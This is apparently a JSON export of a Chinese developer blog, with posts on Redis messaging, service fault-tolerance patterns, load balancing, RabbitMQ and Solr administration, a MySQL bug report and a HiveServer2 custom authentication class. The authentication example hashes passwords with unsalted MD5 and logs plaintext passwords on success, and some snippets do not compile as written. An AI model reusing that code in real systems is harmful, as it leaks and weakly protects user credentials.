&lt;/bean&gt; 123456789101112131415161718192021222324252627282930import org.springframework.data.redis.connection.Message;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.serializer.RedisSerializer;/** * @author xwolf **/public class RedisMessageListener implements org.springframework.data.redis.connection.MessageListener &#123; private Logger log = LoggerFactory.getLogger(RedisMessageListener.class); @Autowired private RedisTemplate&lt;String,String&gt; redisTemplate; public RedisTemplate getRedisTemplate() &#123; return redisTemplate; &#125; public void setRedisTemplate(RedisTemplate redisTemplate) &#123; this.redisTemplate = redisTemplate; &#125; @Override public void onMessage(Message message, byte[] pattern) &#123; RedisSerializer serializer = redisTemplate.getValueSerializer(); String messageStr = (String) serializer.deserialize(message.getBody()); String channel = new String(message.getChannel()); log.info(\"channel=&#123;&#125;,messageStr=&#123;&#125;\",channel,messageStr); &#125;&#125; 调用RedisTemplate的convertAndSend方法发消息即可. 由于没有引入其他MQ,暂时用redis来替代. 至于redis和各个MQ的区别,参考知乎某一回答: 如有错误,欢迎批评指正,请不吝赐教.","updated":"2020-07-19T00:23:27.897Z","tags":[{"name":"redis","slug":"redis","permalink":"http://xwolf191.github.io/tags/redis/"}]},{"title":"服务容错","date":"2018-04-24T10:00:00.000Z","path":"2018/04/24/distributed/服务容错/","text":"背景随着美团点评服务框架和服务治理体系的逐步成熟，服务化已成为公司内部系统设计的趋势。本着大系统小做、职责单一的原则，我们度假技术团队对业务系统进行了不少服务化拆分工作。随着业务复杂度的增加，依赖的服务也逐步增加，出现了不少由于服务调用出现异常问题而导致的重大事故，如： 1）系统依赖的某个服务发生延迟或者故障，数秒内导致所有应用资源（线程，队列等）被耗尽，造成所谓的雪崩效应 (Cascading Failure)，导致整个系统拒绝对外提供服务。 2）系统遭受恶意爬虫袭击，在放大效应下没有对下游依赖服务做好限速处理，最终导致下游服务崩溃。 容错是一个很大的话题，受篇幅所限，本文将介绍仅限定在服务调用间常用的一些容错模式。 设计原则服务容错的设计有个基本原则，就是“Design for Failure”。为了避免出现“千里之堤溃于蚁穴”这种情况，在设计上需要考虑到各种边界场景和对于服务间调用出现的异常或延迟情况，同时在设计和编程时也要考虑周到。这一切都是为了达到以下目标： 一个依赖服务的故障不会严重破坏用户的体验。 系统能自动或半自动处理故障，具备自我恢复能力。 基于这个原则和目标，衍生出下文将要介绍的一些模式，能够解决分布式服务调用中的一些问题，提高系统在故障发生时的存活能力。 一些经典的容错模式所谓模式，其实就是某种场景下一类问题及其解决方案的总结归纳，往往可以重用。模式可以指导我们完成任务，作出合理的系统设计方案，达到事半功倍的效果。而在服务容错这个方向，行业内已经有了不少实践总结出来的解决方案。 超时与重试（Timeout and Retry）超时模式，是一种最常见的容错模式，在美团点评的工程实践中大量存在。常见的有设置网络连接超时时间，一次RPC的响应超时时间等。在分布式服务调用的场景中，它主要解决了当依赖服务出现建立网络连接或响应延迟，不用无限等待的问题，调用方可以根据事先设计的超时时间中断调用，及时释放关键资源，如Web容器的连接数，数据库连接数等，避免整个系统资源耗尽出现拒绝对外提供服务这种情况。 重试模式，一般和超时模式结合使用，适用于对于下游服务的数据强依赖的场景（不强依赖的场景不建议使用！），通过重试来保证数据的可靠性或一致性，常用于因网络抖动等导致服务调用出现超时的场景。与超时时间设置结合使用后，需要考虑接口的响应时间分布情况，超时时间可以设置为依赖服务接口99.5%响应时间的值，重试次数一般1-2次为宜，否则会导致请求响应时间延长，拖累到整个系统。 一些实现说明：123456789101112131415161718192021222324252627282930313233343536public class RetryCommand&lt;T&gt; &#123; private int maxRetries = 2;// 重试次数 默认2次 private long retryInterval = 5;//重试间隔时间ms 默认5ms private Map&lt;String, Object&gt; params; public RetryCommand() &#123; &#125; public RetryCommand(long retryInterval, int maxRetries) &#123; this.retryInterval = retryInterval; this.maxRetries = maxRetries; &#125; public T command(Map&lt;String, Object&gt; params)&#123; //Some remote service call with timeout serviceA.doSomethingWithTimeOut(timeout); &#125; private final T retry() throws RuntimeException &#123; int retryCounter = 0; while (retryCounter &lt; maxRetries) &#123; try &#123; return command(params); &#125; catch (Exception e) &#123; retryCounter++; if (retryCounter &gt;= maxRetries) &#123; break; &#125; &#125; &#125; throw new RuntimeException(\"Command failed on all of \" + maxRetries + \" retries\");&#125; //省略&#125; 限流(Rate Limiting/Load Shedder) 限流模式，常用于下游服务容量有限，但又怕出现突发流量猛增（如恶意爬虫，节假日大促等）而导致下游服务因压力过大而拒绝服务的场景。常见的限流模式有控制并发和控制速率，一个是限制并发的数量，一个是限制并发访问的速率。 控制并发 属于一种较常见的限流手段，在工程实践中可以通过信号量机制（如Java中的Semaphore）来控制，举个例子： 假如有一个需求，要读取几万个文件的数据，因为都是IO密集型任务，我们可以启动几十个线程并发的读取，但是如果读到内存后，还需要存储到数据库中，而数据库的连接数只有10个，这时我们必须控制只有十个线程同时获取数据库连接保存数据，否则会报错无法获取数据库连接。这个时候，我们就可以使用Semaphore来控制并发数，如： 12345678910111213141516171819202122232425262728public class SemaphoreTest &#123; private static final int THREAD_COUNT = 30; private static ExecutorService threadPool = Executors .newFixedThreadPool(THREAD_COUNT); private static Semaphore s = new Semaphore(10); public static void main(String[] args) &#123; for (int i = 0; i &lt; THREAD_COUNT; i++) &#123; threadPool.execute(new Runnable() &#123; @Override public void run() &#123; try &#123; s.acquire(); System.out.println(\"save data\"); s.release(); &#125; catch (InterruptedException e) &#123; e.printStack(); &#125; &#125; &#125;); &#125; threadPool.shutdown(); &#125;&#125; 在代码中，虽然有30个线程在执行，但是只允许10个并发的执行。Semaphore的构造方法Semaphore(int permits) 接受一个整型的数字，表示可用的许可证数量。Semaphore(10)表示允许10个线程获取许可证，也就是最大并发数是10。Semaphore的用法也很简单，首先线程使用Semaphore的acquire()获取一个许可证，使用完之后调用release()归还许可证，还可以用tryAcquire()方法尝试获取许可证。 控制速率 在我们的工程实践中，常见的是使用令牌桶算法来实现这种模式，其他如漏桶算法也可以实现控制速率，但在我们的工程实践中使用不多，这里不做介绍，读者请自行了解。 在Wikipedia上，令牌桶算法是这么描述的： 每秒会有r个令牌放入桶中，或者说，每过1/r秒桶中增加一个令牌。 桶中最多存放b个令牌，如果桶满了，新放入的令牌会被丢弃。 当一个n字节的数据包到达时，消耗n个令牌，然后发送该数据包。 如果桶中可用令牌小于n，则该数据包将被缓存或丢弃。 令牌桶控制的是一个时间窗口内通过的数据量，在API层面我们常说的QPS、TPS，正好是一个时间窗口内的请求量或者事务量，只不过时间窗口限定在1s罢了。以一个恒定的速度往桶里放入令牌，而如果请求需要被处理，则需要先从桶里获取一个令牌，当桶里没有令牌可取时，则拒绝服务。令牌桶的另外一个好处是可以方便的改变速度，一旦需要提高速率，则按需提高放入桶中的令牌的速率。 在我们的工程实践中，通常使用Guava中的Ratelimiter来实现控制速率，如我们不希望每秒的任务提交超过两个： 123456789//速率是每秒两个许可final RateLimiter rateLimiter = RateLimiter.create(2.0);void submitTasks(List tasks, Executor executor) &#123; for (Runnable task : tasks) &#123; rateLimiter.acquire(); // 也许需要等待 executor.execute(task); &#125;&#125; 电路熔断器(Circuit Breaker)在我们的工程实践中，偶尔会遇到一些服务由于网络连接超时，系统有异常或load过高出现暂时不可用等情况，导致对这些服务的调用失败，可能需要一段时间才能修复，这种对请求的阻塞可能会占用宝贵的系统资源，如：内存，线程，数据库连接等等，最坏的情况下会导致这些资源被消耗殆尽，使得系统里不相关的部分所使用的资源也耗尽从而拖累整个系统。在这种情况下，调用操作能够立即返回错误而不是等待超时的发生或者重试可能是一种更好的选择，只有当被调用的服务有可能成功时我们再去尝试。 熔断器模式可以防止我们的系统不断地尝试执行可能会失败的调用，使得我们的系统继续执行而不用等待修正错误，或者浪费CPU时间去等到长时间的超时产生。熔断器模式也可以使我们系统能够检测错误是否已经修正，如果已经修正，系统会再次尝试调用操作。下图是个使用熔断器模式的调用流程： 可以从图中看出，当超时出现的次数达到一定条件后，熔断器会触发打开状态，客户端的下次调用将直接返回，不用等待超时产生。 在熔断器内部，往往有以下几种状态： 闭合（closed）状态： 该状态下能够对目标服务或方法进行正常的调用。熔断器类维护了一个时间窗口内调用失败的次数，如果某次调用失败，则失败次数加1。如果最近失败次数超过了在给定的时间窗口内允许失败的阈值(可以是数量也可以是比例)，则熔断器类切换到断开(Open)状态。此时熔断器设置了一个计时器，当时钟超过了该时间，则切换到半断开（Half-Open）状态，该睡眠时间的设定是给了系统一次机会来修正导致调用失败的错误。 断开(Open)状态： 在该状态下，对目标服务或方法的请求会立即返回错误响应，如果设置了fallback方法，则会进入fallback的流程。 半断开（Half-Open）状态： 允许对目标服务或方法的一定数量的请求可以去调用服务。如果这些请求对服务的调用成功，那么可以认为之前导致调用失败的错误已经修正，此时熔断器切换到闭合状态（并且将错误计数器重置）；如果这一定数量的请求有调用失败的情况，则认为导致之前调用失败的问题仍然存在，熔断器切回到断开方式，然后开始重置计时器来给系统一定的时间来修正错误。半断开状态能够有效防止正在恢复中的服务被突然而来的大量请求再次拖垮。 在我们的工程实践中，熔断器模式往往应用于服务的自动降级，在实现上主要基于Netflix开源的组件Hystrix来实现，下图和代码分别是Hystrix中熔断器的原理和定义，更多了解可以查看Hystrix的源码： 1234567891011121314151617181920212223public interface HystrixCircuitBreaker &#123; /** * Every &#123;@link HystrixCommand&#125; requests asks this if it is allowed to proceed or not. * &lt;p&gt; * This takes into account the half-open logic which allows some requests through when determining if it should be closed again. * * @return boolean whether a request should be permitted */ public boolean allowRequest(); /** * Whether the circuit is currently open (tripped). * * @return boolean state of circuit breaker */ public boolean isOpen(); /** * Invoked on successful executions from &#123;@link HystrixCommand&#125; as part of feedback mechanism when in a half-open state. */ public void markSuccess();&#125; 舱壁隔离(Bulkhead Isolation) 在造船行业，往往使用此类模式对船舱进行隔离，利用舱壁将不同的船舱隔离起来，这样如果一个船舱破了进水，只损失一个船舱，其它船舱可以不受影响，而借鉴造船行业的经验，这种模式也在软件行业得到使用。 线程隔离(Thread Isolation)就是这种模式的常见的一个场景。例如，系统A调用了ServiceB/ServiceC/ServiceD三个远程服务，且部署A的容器一共有120个工作线程，采用线程隔离机制，可以给对ServiceB/ServiceC/ServiceD的调用各分配40个线程。当ServiceB慢了，给ServiceB分配的40个线程因慢而阻塞并最终耗尽，线程隔离可以保证给ServiceC/ServiceD分配的80个线程可以不受影响。如果没有这种隔离机制，当ServiceB慢的时候，120个工作线程会很快全部被对ServiceB的调用吃光，整个系统会全部慢下来，甚至出现系统停止响应的情况。 这种Case在我们实践中经常遇到，如某接口由于数据库慢查询，外部RPC调用超时导致整个系统的线程数过高，连接数耗尽等。我们可以使用舱壁隔离模式，为这种依赖服务调用维护一个小的线程池，当一个依赖服务由于响应慢导致线程池任务满的时候，不会影响到其他依赖服务的调用，它的缺点就是会增加线程数。 无论是超时/重试，熔断器，还是舱壁隔离模式，它们在使用过程中都会出现异常情况，异常情况的处理方式间接影响到用户的体验，针对异常情况的处理也有一种模式支撑，这就是回退(fallback)模式。 回退(Fallback)在超时，重试失败，熔断或者限流发生的时候，为了及时恢复服务或者不影响到用户体验，需要提供回退的机制，常见的回退策略有： 自定义处理：在这种场景下，可以使用默认数据，本地数据，缓存数据来临时支撑，也可以将请求放入队列，或者使用备用服务获取数据等，适用于业务的关键流程与严重影响用户体验的场景，如商家/产品信息等核心服务。 故障沉默（fail-silent）：直接返回空值或缺省值，适用于可降级功能的场景，如产品推荐之类的功能，数据为空也不太影响用户体验。 快速失败（fail-fast）：直接抛出异常，适用于数据非强依赖的场景，如非核心服务超时的处理。 应用实例在实际的工程实践中，这四种模式既可以单独使用，也可以组合使用，为了让读者更好的理解这些模式的应用，下面以Netflix的开源组件Hystrix的流程为例说明。 图中流程的说明: 将远程服务调用逻辑封装进一个HystrixCommand。 对于每次服务调用可以使用同步或异步机制，对应执行execute()或queue()。 判断熔断器(circuit-breaker)是否打开或者半打开状态，如果打开跳到步骤8，进行回退策略，如果关闭进入步骤4。 判断线程池/队列/信号量（使用了舱壁隔离模式）是否跑满，如果跑满进入回退步骤8，否则继续后续步骤5。 run方法中执行了实际的服务调用。 a. 服务调用发生超时时，进入步骤8。 判断run方法中的代码是否执行成功。 a. 执行成功返回结果。 b. 执行中出现错误则进入步骤8。 所有的运行状态(成功，失败，拒绝，超时)上报给熔断器，用于统计从而影响熔断器状态。 进入getFallback()回退逻辑。 a. 没有实现getFallback()回退逻辑的调用将直接抛出异常。 b. 回退逻辑调用成功直接返回。 c. 回退逻辑调用失败抛出异常。 返回执行成功结果。 总结服务容错模式在美团点评系统的稳定性保障方面应用很多，学习模式有助于新人直接利用熟练软件工程师的经验，对于提升系统的稳定性有很大的帮助。服务容错的目的主要是为了防微杜渐，除此之外错误的及时发现和监控其实同等重要。随着技术的演化，新的模式在不断的学习与实践中沉淀出来，美团点评度假技术团队在构建一个高可用高性能的系统目标之外，让系统越来越有弹性（Resilience）也是我们新的追求。 参考文献 Netflix Hystrix Wiki Martin Fowler. CircuitBreaker Hanmer R. Patterns for Fault Tolerant Software. Wiley, 2007. Nygard M. 发布！软件的设计与部署. 凃鸣 译. 人民邮电出版社, 2015. 转自: 服务容错模式","updated":"2020-07-19T00:23:27.848Z","tags":[{"name":"分布式","slug":"分布式","permalink":"http://xwolf191.github.io/tags/分布式/"}]},{"title":"负载均衡详解","date":"2018-04-12T02:30:00.000Z","path":"2018/04/12/distributed/loadbalance/","text":"用户对维基媒体Elasticsearch服务器集群的请求通过负载均衡进行路由在计算中，负载平衡可以改善跨多个计算资源（如计算机，计算机集群，网络链接，中央处理单元或磁盘驱动器）的工作负载分布。负载平衡旨在优化资源使用，最大化吞吐量，最小化响应时间并避免任何单一资源的过载。使用多个组件进行负载平衡而不是单个组件可能会通过冗余来提高可靠性和可用性。负载平衡通常涉及专用软件或硬件，例如多层交换机或域名系统服务器进程。 负载平衡与通道绑定的不同之处在于负载平衡在网络套接字（OSI模型第4层）基础上划分网络接口之间的通信量，而通道绑定意味着在较低级别的物理接口之间进行流量划分，每个数据包（OSI模型层3）或基于最短路径桥接等协议的数据链路（OSI模型第2层）。(以上来自wiki) 负载均衡主要是多台服务器共同分担计算任务,把网络请求和计算分配到可用集群服务器上去.画个简单的图： 一、调度算法 轮循(Round Robin)这种方法会将收到的请求循环分配到服务器集群中的每台机器，即有效服务器。如果使用这种方式，所有的标记进入虚拟服务的服务器应该有相近的资源容量 以及负载形同的应用程序。如果所有的服务器有相同或者相近的性能那么选择这种方式会使服务器负载形同。基于这个前提，轮循调度是一个简单而有效的分配请求 的方式。然而对于服务器不同的情况，选择这种方式就意味着能力比较弱的服务器也会在下一轮循环中接受轮循，即使这个服务器已经不能再处理当前这个请求了。 这可能导致能力较弱的服务器超载。 加权轮循(Weighted Round Robin)这种算法解决了简单轮循调度算法的缺点：传入的请求按顺序被分配到集群中服务器，但是会考虑提前为每台服务器分配的权重。管理员只是简单的通过服务 器的处理能力来定义各台服务器的权重。例如，能力最强的服务器A给的权重是100，同时能力最低的服务器给的权重是50。这意味着在服务器B接收到第一个 请求之前前，服务器A会连续的接受到2个请求，以此类推。 最少连接数(Least Connection)以上两种方法都没有考虑的是系统不能识别在给定的时间里保持了多少连接。因此可能发生，服务器B服务器收到的连接比服务器A少但是它已经超载，因为 服务器B上的用户打开连接持续的时间更长。这就是说连接数即服务器的负载是累加的。这种潜在的问题可以通过“最少连接数”算法来避免：传入的请求是根据每 台服务器当前所打开的连接数来分配的。即活跃连接数最少的服务器会自动接收下一个传入的请求。接本上和简单轮询的原则相同：所有拥有虚拟服务的服务器资源 容量应该相近。值得注意的是，在流量率低的配置环境中，各服务器的流量并不是相同的，会优先考虑第一台服务器。这是因为，如果所有的服务器是相同的，那么 第一个服务器优先，直到第一台服务器有连续的活跃流量，否则总是会优先选择第一台服务器。 最少连接数慢启动时间(Least Connection Slow Start Time)对最少连接数和带权重的最小连接数调度方法来说，当一个服务器刚加入线上环境是，可以为其配置一个时间段，在这段时间内连接数是有限制的而且是缓慢 增加的。这为服务器提供了一个‘过渡时间’以保证这个服务器不会因为刚启动后因为分配的连接数过多而超载。这个值在L7配置界面设置。 加权最少连接(Weighted Least Connection)如果服务器的资源容量各不相同，那么“加权最少连接”方法更合适：由管理员根据服务器情况定制的权重所决定的活跃连接数一般提供了一种对服务器非常 平衡的利用，因为他它借鉴了最少连接和权重两者的优势。通常，这是一个非常公平的分配方式，因为它使用了连接数和服务器权重比例;集群中比例最低的服务器 自动接收下一个请求。但是请注意，在低流量情况中使用这种方法时，请参考“最小连接数”方法中的注意事项。 基于代理的自适应负载均衡(Agent Based Adaptive Balancing)除了上述方法之外，负载主机包含一个自适用逻辑用来定时监测服务器状态和该服务器的权重。对于非常强大的“基于代理的自适应负载均衡”方法来说，负 载主机以这种方式来定时检测所有服务器负载情况：每台服务器都必须提供一个包含文件，这个文件包含一个0~99的数字用来标明改服务器的实际负载情况 (0=空前，99=超载，101=失败，102=管理员禁用)，而服务器同构http get方法来获取这个文件;同时对集群中服务器来说，以二进制文件形式提供自身负载情况也是该服务器工作之一，然而，并没有限制服务器如何计算自身的负载 情况。根据服务器整体负载情况，有两种策略可以选择：在常规的操作中，调度算法通过收集的服务器负载值和分配给该服务器的连接数的比例计算出一个权重比 例。因此，如果一个服务器负载过大，权重会通过系统透明的作重新调整。和加权轮循调度方法一样，不正确的分配可以被记录下来使得可以有效的为不同服务器分 配不同的权重。然而，在流量非常低的环境下，服务器报上来的负载值将不能建立一个有代表性的样本;那么基于这些值来分配负载的话将导致失控以及指令震荡。 因此，在这种情况下更合理的做法是基于静态的权重比来计算负载分配。当所有服务器的负载低于管理员定义的下限时，负载主机就会自动切换为加权轮循方式来分 配请求;如果负载大于管理员定义的下限，那么负载主机又会切换回自适应方式。 固定权重(Fixed Weighted)最高权重只有在其他服务器的权重值都很低时才使用。然而，如果最高权重的服务器下降，则下一个最高优先级的服务器将为客户端服务。这种方式中每个真实服务器的权重需要基于服务器优先级来配置。 加权响应(Weighted Response)流量的调度是通过加权轮循方式。加权轮循中所使用的权重是根据服务器有效性检测的响应时间来计算。每个有效性检测都会被计时，用来标记它响应成功花 了多长时间。但是需要注意的是，这种方式假定服务器心跳检测是基于机器的快慢，但是这种假设也许不总是能够成立。所有服务器在虚拟服务上的响应时间的总和 加在一起，通过这个值来计算单个服务物理服务器的权重;这个权重值大约每15秒计算一次。 源IP哈希(Source IP Hash)这种方式通过生成请求源IP的哈希值，并通过这个哈希值来找到正确的真实服务器。这意味着对于同一主机来说他对应的服务器总是相同。使用这种方式，你不需要保存任何源IP。但是需要注意，这种方式可能导致服务器负载不平衡。 二、实现 目前很多网站或应用在设计之初都会为高并发的数据请求做负载均衡,不差钱的土豪用户一般会直接买F5硬件设备作为其负载均衡器，原因不用多说，其功能强大，不仅包含负载均衡还包括应用交换、会话交换、状态监控、智能网络地址转换、通用持续性、响应错误处理、IPv6网关、高级路由、智能端口镜像、SSL加速、智能HTTP压缩、TCP优化、第7层速率整形、内容缓冲、内容转换、连接加速、高速缓存、Cookie加密、选择性内容加密、应用攻击过滤、拒绝服务(DoS)攻击和SYN Flood保护、防火墙过滤等功能，是不是很强大？当然价格也是让人很“心动”。而一些预算并不高，正在初期发展的网站来说，Nginx这种软负载也能很好的满足其数据分流的需求。 1. 硬件实现(F5)以F5具体的产品的功能特点来说明: 2. 软件实现(nginx为例)nginx Nginx（程式化为NGINX，NGiИX或nginx的）是一种网络服务器，其也可以被用作反向代理，负载平衡器和HTTP缓存。该软件由Igor Sysoev创建，并于2004年首次公开发布。一家同名公司于2011年成立，以提供支持。Nginx是免费的开放源代码软件，根据类BSD许可条款发布。很大一部分Web服务器使用NGINX,经常作为负载均衡器。 人气根据Netcraft的2016年11月网络服务器调查， Nginx被发现是所有“活跃”站点（18.22％的受访站点）和百万最繁忙站点中使用次数最多的Web服务器（27.83％受访网站）。根据W3Techs的数据，前100万个网站中的37.7％，前10万个网站中的49.7％以及前10000个网站中的57.0％使用了它。根据BuiltWith的数据，在10,000个网站中，有38.2％的网站使用了它，并且在10万，10万和1百万的网站中增长。维基百科使用Nginx作为其SSL终止代理。从OpenBSD开始版本5.2（2012年11月1日）中，Nginx成为OpenBSD基础系统的一部分，提供了替代系统的Ap​​ache 1.3的分支，该分支旨在替代它，但后来被OpenBSD自己的httpd. 特点Nginx可以通过使用FastCGI，脚本的SCGI处理程序，WSGI应用程序服务器或Phusion Passenger模块来部署网络上的动态HTTP内容，并且可以充当软件负载平衡器。 Nginx使用异步 事件驱动的方法来处理请求。Nginx的模块化事件驱动架构可以在高负载下提供更可预测的性能. HTTP代理和Web服务器功能能够处理超过10,000个具有较低内存占用空间的同时连接（每10k个非活动HTTP保持活动连接约2.5 MB ）处理静态文件，索引文件和自动索引反向代理与缓存通过带内健康检查进行负载平衡TLS / SSL与SNI和OCSP装订支持,通过OpenSSL的。FastCGI，SCGI，uWSGI支持与缓存基于名称和IP地址的虚拟服务器与IPv6兼容WebSockets和HTTP/1.1升级(101交换协议)邮件代理功能TLS / SSL支持STARTTLS支持SMTP,POP3和IMAP 代理使用外部HTTP服务器进行身份验证其他功能包括升级可执行文件和配置,无需客户端连接丢失,以及基于模块的架构，同时支持核心和第三方模块。付费Plus产品还包含其他功能，例如高级负载平衡和访问扩展的性能监控指标套件。 nginx负载均衡策略 ngx_http_upstream_round_robin，加权轮询，可均分请求，是默认的HTTP负载均衡算法，集成在框架中。 ngx_http_upstream_ip_hash_module，IP哈希，可保持会话。 ngx_http_upstream_least_conn_module，最少连接数，可均分连接。 ngx_http_upstream_hash_module，一致性哈希，可减少缓存数据的失效。 ribbon 除nginx提供负载均衡策略外,ribbon 也提供了对应的负载均衡策略.具体参考ribbon github.其他还有HAProxy、LVS等.","updated":"2020-07-19T00:23:27.814Z","tags":[{"name":"分布式","slug":"分布式","permalink":"http://xwolf191.github.io/tags/分布式/"}]},{"title":"rabbitmq安装(windows)","date":"2018-03-30T10:30:00.000Z","path":"2018/03/30/mq/rabbitmq安装/","text":"RabbitMQ is the most widely deployed open source message broker.With more than 35,000 production deployments of RabbitMQ world-wide at small startups and large enterprises, RabbitMQ is the most popular open source message broker.RabbitMQ is lightweight and easy to deploy on premises and in the cloud. It supports multiple messaging protocols. RabbitMQ can be deployed in distributed and federated configurations to meet high-scale, high-availability requirements. 下载本文以rabbitmq3.7.4版本为例,来做简单的安装(windows).rabbimq是Erlang语言开发,安装rabbitmq之前先安装配置Erlang语言开发环境,然后下载rabbitmq安装包. 安装点击exe一直下一步即可,进入sbin目录,执行rabbitmq-server.bat start 启动server 。默认没有图形界面,执行12345678910111213D:\\rabbitmq_server-3.7.4\\sbin&gt;rabbitmq-plugins.bat enable rabbitmq_managementEnabling plugins on node rabbit@PC-2018:rabbitmq_managementThe following plugins have been configured: rabbitmq_management rabbitmq_management_agent rabbitmq_web_dispatchApplying plugin configuration to rabbit@PC-2018...The following plugins have been enabled: rabbitmq_management rabbitmq_management_agent rabbitmq_web_dispatchset 3 plugins. 安装web插件.重新启动rabbitmq,1234567891011D:\\rabbitmq_server-3.7.4\\sbin&gt;rabbitmq-server.bat start ## ## ## ## RabbitMQ 3.7.4. Copyright (C) 2007-2018 Pivotal Software, Inc. ########## Licensed under the MPL. See http://www.rabbitmq.com/ ###### ## ########## Logs: C:/Users/xwolf/AppData/Roaming/RabbitMQ/log/RABBIT~1.LOG C:/Users/xwolf/AppData/Roaming/RabbitMQ/log/rabbit@PC-2018_upgrade.log Starting broker... completed with 3 plugins. 上述信息,表示rabbitmq正常启动. rabbitmq 默认图形界面地址http://localhost:15672,默认用户名、密码为guest/guest.","updated":"2020-07-19T00:23:27.898Z","tags":[{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://xwolf191.github.io/tags/rabbitmq/"}]},{"title":"Solr删除索引信息","date":"2018-03-19T05:20:00.000Z","path":"2018/03/19/大数据/Solr删除索引信息/","text":"在solr管理页面document视图下操作,切记 commit。操作面板选择信息: Request-Handler (qt) /update Document Type XML 1.清空索引库 commit 不能少,否则不会提交. 1234&lt;delete&gt;&lt;query&gt;*:*&lt;/query&gt;&lt;/delete&gt;&lt;commit/&gt; 2.根据指定属性删除索引 123&lt;delete&gt;&lt;query&gt;key:value&lt;/query&gt;&lt;/delete&gt;&lt;commit/&gt; 12&lt;delete&gt;&lt;id&gt;1&lt;/id&gt;&lt;/delete&gt;&lt;commit/&gt;","updated":"2020-07-19T00:23:27.964Z","tags":[{"name":"solr","slug":"solr","permalink":"http://xwolf191.github.io/tags/solr/"}]},{"title":"Too many arguments (first extra is 'start')","date":"2018-02-27T06:30:00.000Z","path":"2018/02/27/数据库/mysql/Too many arguments (first extra is 'start')/","text":"[31 Oct 2006 16:38] Craig Sylvester Description:Instance Manager fails to start database server with the following error being reported: 061031 11:02:10 guardian: starting instance mysqld2/usr/local/mysql5.0.26/bin/mysqld: Too many arguments (first extra is ‘’).Use —help to get a list of available options Entry in /etc/my.cnf file reads: [mysqld50026]mysqld-path = /usr/local/mysql5.0.26/bin/mysqldserver-id = 1port = 3306pid-file = /tmp/mysql50026.pidsocket = /tmp/mysql50026.sockdatadir = /usr/local/mysql5.0.26/data NOTE: This appears to be related to bug #21275 and if fact may be the same issue if the XXX contains periods. How to repeat:Install server in directory (or create link) with periods in the path (i.e., /usr/local/mysql5.0.26) and change my.cnf entries accordingly. Modify the mysql.server script to start the Instance Manager instead of using mysqld_safe: use_mysqld_safe = 0 Attempt to start server with instance manager: “$MYSQL_HOME/bin/mysqlmanager —user=mysql —pid-file=/tmp/mysqlmanager.pid” or “/etc/init.d/mysql.server start” Suggested fix:Removing the periods from the mysqld-path entry fixes the problem. So the my.cnf entry now reads: [mysqld50026]mysqld-path = /usr/local/mysql50026/bin/mysqldserver-id = 1port = 3306pid-file = /tmp/mysql50026.pidsocket = /tmp/mysql50026.sockdatadir = /usr/local/mysql50026/data [28 Nov 2006 14:14] Godofredo Miguel Solorzano Thank you for the bug report. I was unable to repeat with today sourcerepository server on Suse Linux 10: 061128 12:06:19 IM pid file: ‘/tmp/mysqlmanager.pid’; PID: 5758.061128 12:06:20 guardian: starting instance ‘mysqld5032’…061128 12:06:20 starting instance ‘mysqld5032’…061128 12:06:20 accepting connections on ip socket (port: 2273)061128 12:06:20 accepting connections on unix socket ‘/tmp/mysqlmanager.sock’061128 12:06:20 InnoDB: Started; log sequence number 0 43655061128 12:06:21 [Note] /home/miguel/mysql5.0.32/libexec/mysqld: ready for connections.Version: ‘5.0.32-debug’ socket: ‘/tmp/mysql50032.sock’ port: 3306 Source distribution061128 12:06:40 guardian: instance ‘mysqld5032’ is running, set state to STARTED. 转自 Bug #23808 Instance Manager reporting “Too many arguments (first argument is ‘’)”","updated":"2020-07-19T00:23:28.016Z","tags":[{"name":"mysql","slug":"mysql","permalink":"http://xwolf191.github.io/tags/mysql/"}]},{"title":"HiveServer2自定义用户认证","date":"2018-02-07T07:30:00.000Z","path":"2018/02/07/大数据/HiveServer2自定义用户认证/","text":"以前的命令行操作都是没有密码认证的,随意输入都可以连接到hiveserver。今天要解决这个问题,通过自定义配置文件来指定用户可以访问hive server,仍然以Hive 2.3.0版本来说明.Hive server2 提供了NOSASL, KERBEROS, LDAP, PAM , CUSTOM这几种方式来认证用户,此处以CUSTOM为例来说明,其他的方式参考官网实例. 自定义认证自定义认证需要实现PasswdAuthenticationProvider接口,从指定的配置文件中读取用户信息比较即可. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990import com.xwolf.big.util.MD5;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.hive.conf.HiveConf;import org.apache.hive.service.auth.PasswdAuthenticationProvider;import javax.security.sasl.AuthenticationException;import java.io.BufferedReader;import java.io.File;import java.io.FileReader;/** * Hive Server自定义认证 * @author xwolf * @since 1.8 **/public class HiveServerCustomeAuth implements PasswdAuthenticationProvider&#123; /** * * @param username 用户名 * @param password 密码 * @throws AuthenticationException */ @Override public void Authenticate(String username, String password) throws AuthenticationException &#123; boolean result = false; HiveConf hiveConf = new HiveConf(); Configuration conf = new Configuration(hiveConf); String passMd5 = MD5.md5(password); //读取自定义配置文件 String filePath = conf.get(\"hive.server2.custom.authentication.file\"); File file = new File(filePath); try(BufferedReader reader = new BufferedReader(new FileReader(file))) &#123; String tempString; while (null != (tempString = reader.readLine())) &#123; String[] datas = tempString.split(\",\"); if(datas.length != 2) &#123; continue; &#125; if(datas[0].equals(username) &amp;&amp; datas[1].equals(passMd5)) &#123; result = true; break; &#125; &#125; if (result)&#123; System.out.println(String.format(\"[user]=%s,[password]=%s,authenticate success\",username,password)); &#125; else &#123; throw new AuthenticationException(); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); throw new AuthenticationException(\"User Authenticate Error,Maybe the configuration file has some error.\"); &#125; &#125;&#125;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;/** * @author xwolf * @since 1.8 **/public class MD5 &#123; private static final char hexDigits[] = &#123;'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'&#125;; public static String md5(String str) &#123; try &#123; MessageDigest digest = MessageDigest.getInstance(\"MD5\"); byte[] btInput = str.getBytes(); digest.reset(); digest.update(btInput); byte[] md = digest.digest(); // 把密文转换成十六进制的字符串形式 int j = md.length; char strChar[] = new char[j * 2]; int k = 0; for (int i = 0; i &lt; j; i++) &#123; byte byte0 = md[i]; strChar[k++] = hexDigits[byte0 &gt;&gt;&gt; 4 &amp; 0xf]; strChar[k++] = hexDigits[byte0 &amp; 0xf]; &#125; return new String(strChar); &#125; catch (NoSuchAlgorithmException e) &#123; e.printStackTrace(); &#125; return null; &#125;&#125; 配置hive.site.xml配置如下信息: 修改hive.server2.authentication 为CUSTOM,hive.server2.custom.authentication.class指定为自定义类. 配置文件属性新增即可.user.conf 